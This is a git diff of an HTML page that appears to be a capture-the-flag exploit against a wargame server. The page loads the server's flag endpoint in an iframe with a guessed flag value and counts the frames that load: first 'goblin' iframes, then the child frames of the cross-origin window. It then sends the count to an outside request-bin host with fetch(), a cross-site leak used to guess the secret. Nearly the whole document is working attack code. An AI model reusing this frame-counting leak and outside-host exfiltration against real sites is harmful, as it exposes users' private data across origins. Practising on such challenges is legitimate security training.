@@ -3,32 +3,31 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Flag Finder1</title>
+    <title>Iframe Example</title>
 </head>
 <body>
-    <h1>Flag Finder11</h1>
+    <h1>Main Frame</h1>
     <script>
-        const checkFlag = async () => {
-            const requestUrl = `http://war.sschall.xyz:60001/flag?flag=ahspace`; // 고정된 flag
+        const iframe = document.createElement('iframe');
+        iframe.id = 'main_frame';
+        iframe.src = 'http://war.sschall.xyz:60001/flag?flag=s';
+        iframe.width = '100%';
+        iframe.height = '600px';
+        document.body.appendChild(iframe);
 
-            // iframe 생성
-            const iframe = document.createElement('iframe');
-            iframe.src = requestUrl;
-            document.body.appendChild(iframe);
+        iframe.onload = async () => {
+            let childIframesCount;
 
-            // 잠시 대기
-            await new Promise(resolve => setTimeout(resolve, 5000)); // 5초 대기
+            try {
+                childIframesCount = iframe.contentWindow.frames.length; // 자식 iframe 개수 가져오기
+            } catch (e) {
+                console.error('Error accessing child iframes:', e);
+                childIframesCount = -1; // 오류 발생 시 -1로 설정
+            }
 
-            const goblinIframes = document.querySelectorAll('iframe[id="goblin"]');
-            const currentGoblinCount = goblinIframes.length;
-
-            // goblin iframe 개수에 따라 요청 보내기
-            const finalRequestUrl = `https://hxfqwbg.request.dreamhack.games?goblinCount=${currentGoblinCount}`;
-            fetch(finalRequestUrl);
-            console.log(`Goblin iframe count sent: ${currentGoblinCount}`);
+            // 자식 iframe 개수를 서버로 전송
+            await fetch(`https://olohpnk.request.dreamhack.games?iframeCount=${childIframesCount}`);
         };
-
-        checkFlag();
     </script>
 </body>
 </html>
